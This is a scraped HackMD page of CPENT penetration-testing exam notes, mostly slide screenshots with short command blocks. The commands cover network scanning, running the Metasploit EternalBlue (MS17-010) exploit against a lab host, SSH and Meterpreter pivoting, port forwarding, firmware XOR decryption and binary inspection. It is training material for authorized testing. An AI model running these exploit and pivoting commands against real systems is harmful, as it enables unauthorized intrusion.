A%24gdb%20-q%20%2Fbin%2Fbash%0A%24break%20main%0A%24run%0A%24info%20registers%0A%0A%60%60%60%0A%0A!%5B2024-04-18%2011_33_09-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJNgBG0xC.png)%0A!%5B2024-04-18%2011_33_20-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyVlrzRgA.png)%0A!%5B2024-04-18%2011_33_33-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJVeHG0lR.png)%0A!%5B2024-04-18%2011_33_47-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS14lrfAx0.png)%0A!%5B2024-04-18%2011_33_59-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJEerMAeR.png)%0A!%5B2024-04-18%2011_34_13-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr1ExHzRgR.png)%0A!%5B2024-04-18%2011_34_25-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkNgrGAxR.png)%0A!%5B2024-04-18%2011_34_40-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyNgHfAeC.png)%0A%0A%0A%23%23%20AD%20PT%0A%0A%0A!%5B2024-04-18%2011_47_38-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FryA_dMCg0.png)%0A!%5B2024-04-18%2011_47_55-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkgAudMAgR.png)%0A!%5B2024-04-18%2011_48_11-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkA_dMCeR.png)%0A!%5B2024-04-18%2011_48_23-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyCduG0gC.png)%0A!%5B2024-04-18%2011_48_39-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkA__fAeC.png)%0A!%5B2024-04-18%2011_48_52-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHyAudGAlC.png)%0A!%5B2024-04-18%2011_49_06-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FryC_uGAeR.png)%0A!%5B2024-04-18%2011_49_19-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJCddf0xC.png)%0A!%5B2024-04-18%2011_49_32-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyCdOGRe0.png)%0A!%5B2024-04-18%2011_49_45-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1R__GCg0.png)%0A%0A%0A%23%23%20Web%20to%20RCE%0A%0A!%5B2024-04-18%2011_52_02-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS19ttfCgA.png)%0A!%5B2024-04-18%2011_52_13-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FB19KYfReC.png)%0A!%5B2024-04-18%2011_52_24-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr1ctFG0eC.png)%0A!%5B2024-04-18%2011_52_34-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH1qFKGRgR.png)%0A!%5B2024-04-18%2011_52_48-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH1cttMAl0.png)%0A!%5B2024-04-18%2011_53_01-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSy9YKGClA.png)%0A!%5B2024-04-18%2011_53_15-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyqFFfClC.png)%0A!%5B2024-04-18%2011_53_28-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJ5KYzRgC.png)%0A!%5B2024-04-18%2011_53_45-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkcYYfAxR.png)%0A!%5B2024-04-18%2011_53_59-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBkcKKMAxC.png)%0A!%5B2024-04-18%2011_54_14-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBy5ttzAeC.png)%0A%0A%0A","viewMode":"publish","unreadState":[],"isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"lastChangeUserInfo":{"name":"techbeck","path":"6AhJdzpGTyGDlAxru4jZbA","avatarUrl":"https%3A%2F%2Fuploads-public.hackmd.io%2FnxSlZKb.jpg"}}`);
+  window.owner = "e8084977-3a46-4f21-8394-0c6bbb88d96c";
+  (function () {
+    const decodeStringProps = (props) => {
+      for (const key in props) {
+        if (typeof props[key] === 'string') {
+          props[key] = decodeURIComponent(props[key])
+        } else if (typeof props[key] === 'object') {
+          decodeStringProps(props[key])
+        }
+      }
+    }
+    decodeStringProps(window.publishProps)
+  })()
+</script>
+
+
+    <script src="https://tally.so/widgets/embed.js"></script>
+
+    
+</head>
+
+<body class="ui-pretty-page" style="display:none;">
+    <div id="toasts-container" class="toasts-container z-[2000]"></div>
+    <div id="publish-page">---
+tags: 工作用, Pentest, 滲透測試, CPENT
+---
+
+# CPENT考試筆記(Vincent)
+
+## SCAN
+
+![2024-04-18 10_54_50-CPENT - PowerPoint](https://hackmd.io/_uploads/ry0JnbCg0.png)
+
+```bash=
+$ sudo nmap -n -sn -PS22,80,445,3389 192.168.0.1-254 -oG ip_scan.txt
+$ grep Up ip_scan.txt | cut -d&#34;&#34; -f2
+```
+
+![2024-04-18 10_55_00-CPENT - PowerPoint](https://hackmd.io/_uploads/ry0khW0lA.png)
+
+![2024-04-18 10_55_14-CPENT - PowerPoint](https://hackmd.io/_uploads/ryAJ3ZRe0.png)
+
+
+
+![2024-04-18 10_55_27-CPENT - PowerPoint](https://hackmd.io/_uploads/rkC13-RxA.png)
+
+```bash=
+for i in {1..254}; do (ping -c 192.168.0.$i | grep &#34;bytes from&#34; &amp;); done
+```
+
+![2024-04-18 10_55_40-CPENT - PowerPoint](https://hackmd.io/_uploads/rk01hZAeA.png)
+
+```bash=
+$sudo nmap -p 1-1024
+$sudo nmap -p 1024-
+$sudo nmap -p -1024
+$sudo nmap -p -
+
+$sudo nmap -n scanme.nmap.org -p22,25,80,135 --reason
+```
+
+![2024-04-18 10_55_52-CPENT - PowerPoint](https://hackmd.io/_uploads/rk0J2WAlA.png)
+
+```bash=
+$sudo dpkg -i rustscan_2.0.1_amd64.deb
+$rustscan -u 5000 -t 7000 -a 192.168.0.7
+$rustscan -u 5000 -t 7000 --script none -a 192.168.0.7
+$rustscan -u 5000 -t 7000 -a 192.168.0.7 -- -Pn -sVC -oA 7_host
+```
+
+### Exploit MS17_010
+![2024-04-18 10_56_03-CPENT - PowerPoint](https://hackmd.io/_uploads/S10y2ZAlR.png)
+```bash=
+$msfconsole
+
+&gt;search ms17_010
+&gt;use exploit/windows/smb/ms17_010_eternalblue
+&gt;show options
+&gt;set rhosts 192.168.0.7
+&gt;check
+&gt;exploit
+```
+
+![2024-04-18 10_56_16-CPENT - PowerPoint](https://hackmd.io/_uploads/SJAJnW0xR.png)
+
+
+
+## ENUMERATION
+
+![2024-04-18 11_08_16-CPENT - PowerPoint](https://hackmd.io/_uploads/SyLgkMAxA.png)
+![2024-04-18 11_08_25-CPENT - PowerPoint](https://hackmd.io/_uploads/rJ8eyMReR.png)
+![2024-04-18 11_08_33-CPENT - PowerPoint](https://hackmd.io/_uploads/r1IeJz0lC.png)
+![2024-04-18 11_08_41-CPENT - PowerPoint](https://hackmd.io/_uploads/r1UlJGRxR.png)
+![2024-04-18 11_08_48-CPENT - PowerPoint](https://hackmd.io/_uploads/SJUlkG0eA.png)
+![2024-04-18 11_08_57-CPENT - PowerPoint](https://hackmd.io/_uploads/Sk8l1MCxA.png)
+![2024-04-18 11_09_03-CPENT - PowerPoint](https://hackmd.io/_uploads/SkLgJzAeA.png)
+![2024-04-18 11_09_15-CPENT - PowerPoint](https://hackmd.io/_uploads/BJUgyzAxR.png)
+
+
+
+## Privilege Escalation
+
+![2024-04-18 11_24_19-CPENT - PowerPoint](https://hackmd.io/_uploads/r16ufz0x0.png)
+
+
+## Egress Busting
+
+![2024-04-18 11_24_44-CPENT - PowerPoint](https://hackmd.io/_uploads/SkznfzAl0.png)
+![2024-04-18 11_25_03-CPENT - PowerPoint](https://hackmd.io/_uploads/rJz2fzAg0.png)
+
+
+## Persistent
+
+![2024-04-18 11_25_34-CPENT - PowerPoint](https://hackmd.io/_uploads/BkspGMCgA.png)
+
+
+## POST
+
+![2024-04-18 11_26_00-CPENT - PowerPoint](https://hackmd.io/_uploads/By71QfRxR.png)
+
+
+## OT
+
+![2024-04-18 11_26_27-CPENT - PowerPoint](https://hackmd.io/_uploads/rJNzmMAeR.png)
+
+![2024-04-18 11_26_42-CPENT - PowerPoint](https://hackmd.io/_uploads/r14zmG0gR.png)
+
+
+## Pivoting &amp; Double Pivoting 跳台 &amp; 雙跳台
+
+![2024-04-18 11_27_24-CPENT - PowerPoint](https://hackmd.io/_uploads/SkxjAXfClA.png)
+
+![2024-04-18 11_27_34-CPENT - PowerPoint](https://hackmd.io/_uploads/BkoRQMClR.png)
+
+![2024-04-18 11_27_50-CPENT - PowerPoint](https://hackmd.io/_uploads/BJjCQM0eR.png)
+
+![2024-04-18 11_28_02-CPENT - PowerPoint](https://hackmd.io/_uploads/rkjR7MRl0.png)
+
+```bash=
+$ssh -L: 80:192.168.0.24:80 administrator @192.168.0.70
+```
+
+![2024-04-18 11_28_13-CPENT - PowerPoint](https://hackmd.io/_uploads/Syo0XfCxC.png)
+
+```bash=
+$ssh -R *:8008:192.168.0.24:80 administrator@192.168.0.70
+
+$sudo nano /etc/ssh/sshd_config
+→GatewayPorts yes
+$sudo service ssh restart
+
+```
+
+![2024-04-18 11_28_33-CPENT - PowerPoint](https://hackmd.io/_uploads/BksCmz0lR.png)
+
+```bash=
+$ssh -D 9050 administrator@192.168.0.70
+$sudo nano /etc/proxychains.conf
+```
+
+![2024-04-18 11_28_46-CPENT - PowerPoint](https://hackmd.io/_uploads/S1jC7zRxA.png)
+
+```bash=
+$ssh -J administrator@192.168.0.70 administrator@192.168.0.10 -L *:8888:192.168.0.24:80
+```
+
+![2024-04-18 11_28_58-CPENT - PowerPoint](https://hackmd.io/_uploads/SJoRmMCg0.png)
+
+```bash=
+# MSF
+&gt;Use exploit/multi/ssh/sshexec
+&gt;set rhosts&lt;&gt;
+&gt;set username&lt;&gt;
+&gt;set password &lt;&gt;
+&gt;exploit
+
+## Meterpreter (Session-Routing)
+&gt;run post/multi/manage/autoroute OPTION=s
+&gt;run autoroute -p
+&gt;background
+
+```
+
+![2024-04-18 11_29_12-CPENT - PowerPoint](https://hackmd.io/_uploads/BJoA7fCeA.png)
+
+```bash=
+https://github.com/bovine/datapine/blob/master/datapipe.c
+# change Line 80: 20 -&gt; 999
+$gcc datapine.c -o datapine
+
+datapipe 0.0.0.0 135 &lt;WIN&gt; 135
+datapipe 0.0.0.0 445 &lt;WIN&gt; 445
+datapipe 0.0.0.0 4444 &lt;PARROT&gt; 4444
+```
+
+![2024-04-18 11_29_25-CPENT - PowerPoint](https://hackmd.io/_uploads/rksC7G0eA.png)
+
+```bash=
+#Socat (full function, fat, support UDP)
+socat tcp-listen:80,fork tcp:&lt;IP&gt;:80
+socat udp-recvfrom:161,fork udp-sendto:&lt;IP&gt;:161
+socat udp-recvfrom:53,fork udp-sendto:&lt;IP&gt;:53
+socat udp-recvfrom:123,fork udp-sendto:&lt;IP&gt;:123
+
+#Portproxy(Windows netsh built-in)
+netsh interface portproxy add v4tov4 80 &lt;IP&gt; 80
+netsh interface portproxy show v4tov4
+netsh interface portproxy delete v4tov4 80 &lt;IP&gt; 80
+```
+
+![2024-04-18 11_29_39-CPENT - PowerPoint](https://hackmd.io/_uploads/HJsR7zCeR.png)
+
+![2024-04-18 11_29_54-CPENT - PowerPoint](https://hackmd.io/_uploads/B1sCmz0gR.png)
+
+
+
+## IOT
+
+![2024-04-18 11_30_47-CPENT - PowerPoint](https://hackmd.io/_uploads/S1RmNMRlC.png)
+![2024-04-18 11_31_00-CPENT - PowerPoint](https://hackmd.io/_uploads/S1CmVzAeA.png)
+![2024-04-18 11_31_12-CPENT - PowerPoint](https://hackmd.io/_uploads/SyRmNfReA.png)
+
+```bash=
+$binwalk -t encrypted.bin
+$hexdump -v -C encrypted.bin
+$binwalk -E encrypted.bin
+$hexdump -v -C encrypted.bin | cut -d&#34; &#34; -f3-20 | sort | uniq -c | sort -nr | head -n 20
+$chmod +x xcat.py
+$./xcat.py -x &lt;xor_key&gt; encrypted.bin &gt; decrypted.bin
+$binwalk -t decrypted.bin
+```
+
+![2024-04-18 11_31_26-CPENT - PowerPoint](https://hackmd.io/_uploads/ByAm4GAlC.png)
+
+```bash=
+$python3 -m pip3 install xortool
+$xortool enctypted.bin
+$xortool enctypted.bin -l 8 -c 00
+$binwalk -t -e xortool_out/0.out
+$cat xortool_out/filename-key.csv
+$python -c &#34;print(b&#39;\x88D\xa2\xd1h\xb4Z-&#39;.hex())&#34;
+```
+
+## BINARY
+
+![2024-04-18 11_31_58-CPENT - PowerPoint](https://hackmd.io/_uploads/ByElHGRg0.png)
+
+![2024-04-18 11_32_14-CPENT - PowerPoint](https://hackmd.io/_uploads/Hy4lSMAxR.png)
+
+- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail
+- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/march/inside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2
+- https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/
+- http://blog.dkbza.org/2012/08/pe-file-format-graphs.html
+
+
+![2024-04-18 11_32_29-CPENT - PowerPoint](https://hackmd.io/_uploads/S1EerfAl0.png)
+
+
+![2024-04-18 11_32_40-CPENT - PowerPoint](https://hackmd.io/_uploads/rJVgHzCx0.png)
+
+- https://web.archive.org/web/20171130164537/http://nairobi-embedded.org/004_elf_format.html
+- https://web.archive.org/web/20171129031316/http://nairobi-embedded.org/040_elf_sec_seg_vma_mappings.html
+
+![2024-04-18 11_32_54-CPENT - PowerPoint](https://hackmd.io/_uploads/HkQxSz0eR.png)
+
+```bash=
+$strings ./crackme0x00a | grep GLIBC
+$objdump -d /bin/bash
+$objdump -d -M intel /bin/bash
+
+use gdb to look at the registers
+$gdb -q /bin/bash
+$break main
+$run
+$info registers
+
+```
+
+![2024-04-18 11_33_09-CPENT - PowerPoint](https://hackmd.io/_uploads/BJNgBG0xC.png)
+![2024-04-18 11_33_20-CPENT - PowerPoint](https://hackmd.io/_uploads/SyVlrzRgA.png)
+![2024-04-18 11_33_33-CPENT - PowerPoint](https://hackmd.io/_uploads/SJVeHG0lR.png)
+![2024-04-18 11_33_47-CPENT - PowerPoint](https://hackmd.io/_uploads/S14lrfAx0.png)
+![2024-04-18 11_33_59-CPENT - PowerPoint](https://hackmd.io/_uploads/SJEerMAeR.png)
+![2024-04-18 11_34_13-CPENT - PowerPoint](https://hackmd.io/_uploads/r1ExHzRgR.png)
+![2024-04-18 11_34_25-CPENT - PowerPoint](https://hackmd.io/_uploads/HkNgrGAxR.png)
+![2024-04-18 11_34_40-CPENT - PowerPoint](https://hackmd.io/_uploads/SyNgHfAeC.png)
+
+
+## AD PT
+
+
+![2024-04-18 11_47_38-CPENT - PowerPoint](https://hackmd.io/_uploads/ryA_dMCg0.png)
+![2024-04-18 11_47_55-CPENT - PowerPoint](https://hackmd.io/_uploads/rkgAudMAgR.png)
+![2024-04-18 11_48_11-CPENT - PowerPoint](https://hackmd.io/_uploads/rkA_dMCeR.png)
+![2024-04-18 11_48_23-CPENT - PowerPoint](https://hackmd.io/_uploads/SyCduG0gC.png)
+![2024-04-18 11_48_39-CPENT - PowerPoint](https://hackmd.io/_uploads/rkA__fAeC.png)
+![2024-04-18 11_48_52-CPENT - PowerPoint](https://hackmd.io/_uploads/HyAudGAlC.png)
+![2024-04-18 11_49_06-CPENT - PowerPoint](https://hackmd.io/_uploads/ryC_uGAeR.png)
+![2024-04-18 11_49_19-CPENT - PowerPoint](https://hackmd.io/_uploads/HJCddf0xC.png)
+![2024-04-18 11_49_32-CPENT - PowerPoint](https://hackmd.io/_uploads/SyCdOGRe0.png)
+![2024-04-18 11_49_45-CPENT - PowerPoint](https://hackmd.io/_uploads/S1R__GCg0.png)
+
+
+## Web to RCE
+
+![2024-04-18 11_52_02-CPENT - PowerPoint](https://hackmd.io/_uploads/S19ttfCgA.png)
+![2024-04-18 11_52_13-CPENT - PowerPoint](https://hackmd.io/_uploads/B19KYfReC.png)
+![2024-04-18 11_52_24-CPENT - PowerPoint](https://hackmd.io/_uploads/r1ctFG0eC.png)
+![2024-04-18 11_52_34-CPENT - PowerPoint](https://hackmd.io/_uploads/H1qFKGRgR.png)
+![2024-04-18 11_52_48-CPENT - PowerPoint](https://hackmd.io/_uploads/H1cttMAl0.png)
+![2024-04-18 11_53_01-CPENT - PowerPoint](https://hackmd.io/_uploads/Sy9YKGClA.png)
+![2024-04-18 11_53_15-CPENT - PowerPoint](https://hackmd.io/_uploads/SyqFFfClC.png)
+![2024-04-18 11_53_28-CPENT - PowerPoint](https://hackmd.io/_uploads/SJ5KYzRgC.png)
+![2024-04-18 11_53_45-CPENT - PowerPoint](https://hackmd.io/_uploads/HkcYYfAxR.png)
+![2024-04-18 11_53_59-CPENT - PowerPoint](https://hackmd.io/_uploads/BkcKKMAxC.png)
+![2024-04-18 11_54_14-CPENT - PowerPoint](https://hackmd.io/_uploads/By5ttzAeC.png)
+
+
+</div>
+    <!-- signin modal -->
+
+<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
+            
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+<h3 class="!mt-[30px] md:!mt-[52px]">Sign in</h3>
+
+<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
+    <div class="hmd-dn"><input type="hidden" name="_csrf" value="UKqGznda-CE-G0-lBx5r7jK5X0sZ64zg55J8"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
+    
+    <div class="form-group  ">
+        <label for="email" class="control-label">Email</label>
+        <label for="inputEmail" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
+        <div class="input-block">
+            
+                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email" id="inputEmail">
+            
+            <span class="error-sign"></span>
+        </div>
+    </div>
+    <div class="form-group ">
+        <label for="password" class="control-label">Password</label>
+        <label for="inputPassword" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
+        <div class="input-block">
+            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
+            <span class="error-sign"></span>
+            
+                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
+            
+        </div>
+    </div>
+    <div
+        id="hmd-captcha"
+        data-provider=""
+        data-captcha-data=""
+        class="flex justify-center"
+        style="display: none;"
+    ></div>
+</form>
+
+
+    <div class="last-login-submit-container relative">
+        <input type="submit" data-login-method="email" class="neo-btn neo-btn-primary w-full !justify-center !py-[11px] !text-lg !leading-lg !mx-0" value="Sign in" form="signin-form" formaction="https://hackmd.io/login">
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="!space-y-4">
+    
+        
+            <div class="relative isolate">
+                <span class="bg-background-default text-body leading-normal text-text-subtle px-1.5">or</span>
+                <span class="z-[-1] h-[1px] w-full flex absolute translate-y-[-9.5px] border border-solid border-border-default " aria-hidden="true"></span>
+            </div>
+        
+
+        
+
+
+
+
+
+
+
+
+<div class="oauth-sign-container !space-y-1.5 !m-0">
+    
+    <a href="https://hackmd.io/auth/google" data-login-method="google" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline">
+        <img src="/social/google.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via Google
+        </span>
+    </a>
+    
+
+    <!-- A 1:1 clone of the exact dark button gsi provides. Just in case if Google is not happy with the custom button
+    
+    <a href="https://hackmd.io/auth/google" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline !bg-[#131314] !border-[#8E918F] hocus:!bg-[#131314] hocus:!border-[#8E918F] !text-[#E3E3E3] font-['Roboto_Medium'] isolate group/google-button overflow-hidden relative">
+        <div aria-hidden="true" class="absolute top-0 left-0 z-[-1] bg-white/[.08] tw-hide w-full h-full group-hover/google-button:flex group-focus/google-button:flex"></div>
+        <img src="/social/google.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via Google
+        </span>
+    </a>
+    
+    -->
+
+    
+    <a href="https://hackmd.io/auth/facebook" data-login-method="facebook" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline">
+        <img src="/social/facebook.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via Facebook
+        </span>
+    </a>
+    
+
+    
+    <a href="https://hackmd.io/auth/twitter" data-login-method="twitter" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline">
+        <img src="/social/x.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via X(Twitter)
+        </span>
+    </a>
+    
+
+    
+    <a href="https://hackmd.io/auth/github" data-login-method="github" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline">
+        <img src="/social/github.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via GitHub
+        </span>
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/dropbox" data-login-method="dropbox" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline">
+        <img src="/social/dropbox.svg" width="28">
+        <span class="flex-1 text-center">
+            Sign in via Dropbox
+        </span>
+    </a>
+    
+    
+    
+      <a href="#" data-login-method="web3" class="neo-btn neo-btn-tertiary w-full items-center !py-[7px] !px-[9px] hocus:no-underline btn-web3">
+          <img src="https://hackmd.io/images/wallet.svg" width="28">
+          <span class="sign-in-wallet-text flex-1 text-center">
+              Sign in with Wallet
+          </span>
+
+          <div class="inline-flex items-center justify-between flex-1 hidden web3-wallet-info">
+              <span>
+                   Wallet
+                   (
+                    <span class="web3-wallet-address"></span>
+                   )
+              </span>
+
+              <i class="fa fa-arrow-right" aria-hidden="true"></i>
+          </div>
+      </a>
+
+      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
+          Connect another wallet
+      </small>
+    
+
+    <button type="button" class="ui-continue-with-different neo-btn neo-btn-ghost w-full items-center !py-[7px] !px-[9px] hidden">
+        Continue with a different method
+    </button>
+</div>
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+const displayCount = 4
+;(() => {
+    const container = document.querySelector('.oauth-sign-container')
+    if (!container) return
+    const buttons = Array.from(container.querySelectorAll(':is(a, button).neo-btn.neo-btn-tertiary'))
+    const continueWithDifferent = container.querySelector('.ui-continue-with-different')
+    if (!continueWithDifferent) return
+    if (buttons.length <= displayCount) return
+
+    continueWithDifferent.classList.remove('hidden')
+    for (let i = displayCount; i < buttons.length; i++) {
+        buttons[i].classList.add('hidden')
+    }
+
+    continueWithDifferent.addEventListener('click', () => {
+        continueWithDifferent.classList.add('hidden')
+        const currentButtons = Array.from(container.querySelectorAll(':is(a, button).neo-btn.neo-btn-tertiary'))
+        for (const button of currentButtons) {
+            button.classList.remove('hidden')
+        }
+    })
+})()
+</script>
+
+    
+
+    
+        <div>
+            <p class="!m-0 text-body leading-normal">New to HackMD? <a href="https://hackmd.io/join" class="!text-text-primary hocus:!text-link-text-hover plausible-event-name=LoginModalSignUp">Sign up</a></p>
+        </div>
+    
+</div>
+
+
+
+
+
+    <p class="!text-sm !leading-sm !text-text-subtle">By signing in, you agree to our <a class="!text-text-subtle hocus:!text-text-default" href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
+
+
+        </div>
+    </div>
+</div>
+
+    
+    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
+    <script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
+        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
+        
+    </script>
+
+
+    
+<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });
+  const sentryUserId = document.cookie
+    .split('; ')
+    .map(cookie => cookie.split('='))
+    .reduce((acc, [k, v]) => k === 'userid' ? v : acc, '');
+  Sentry.setUser(sentryUserId ? { id: sentryUserId } : null);
+</script>
+
+
+    
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+
+    <script src="https://hackmd.io/api/i18n.js"></script>
+     <script src="https://assets.hackmd.io/build/font-vendor.da2ff914b6696699c15e.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.d6e5c1bdd49586874403.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.950210cf11a0f5dfba4b.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.dbca79efbc63d9e96ef6.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.7c15dd61fbf06b8fada0.js" defer="defer"></script>
+
+    
+
+</body>
+</html>
